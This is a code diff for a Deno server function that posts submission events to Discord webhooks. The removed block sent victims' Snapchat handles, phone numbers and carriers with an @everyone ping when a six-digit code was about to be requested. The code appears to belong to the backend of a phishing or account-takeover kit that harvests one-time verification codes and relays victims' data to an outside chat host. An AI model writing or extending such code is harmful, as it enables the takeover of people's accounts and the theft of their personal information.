@@ -88,9 +88,6 @@ Deno.serve(async (req) => {
 
     const { label, color } = actionLabels[action] || actionLabels["code_ready"];
 
-    // Extra @everyone ping for code6 action
-    const mentionContent = action === "code6" ? "@everyone 🔢 **Code 6 chiffres demandé !**" : undefined;
-
     const embed = {
       title: label,
       color,
@@ -112,35 +109,8 @@ Deno.serve(async (req) => {
     const webhookRes = await fetch(LOG_WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: mentionContent, embeds: [embed] }),
+      body: JSON.stringify({ embeds: [embed] }),
     });
-
-    // Also notify the main webhook with @everyone when code6 is triggered
-    if (action === "code6") {
-      const mainWebhook = Deno.env.get("DISCORD_WEBHOOK");
-      if (mainWebhook) {
-        const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";
-        await fetch(mainWebhook, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: "@everyone",
-            embeds: [{
-              title: "🔢 Code 6 chiffres demandé",
-              color: 0x9B59B6,
-              fields: [
-                { name: "👻 Snapchat", value: sub?.snapchat || "N/A", inline: true },
-                { name: "📞 Téléphone", value: sub?.telephone || "N/A", inline: true },
-                { name: "📡 Opérateur", value: sub?.operateur || "N/A", inline: true },
-                { name: "ℹ️ Info", value: "L'utilisateur va recevoir une demande de code à 6 chiffres", inline: false },
-              ],
-              footer: { text: `ID: ${submissionId}` },
-              timestamp: now.toISOString(),
-            }]
-          }),
-        }).catch(() => {});
-      }
-    }
 
     if (!webhookRes.ok) {
       const error = await webhookRes.text();
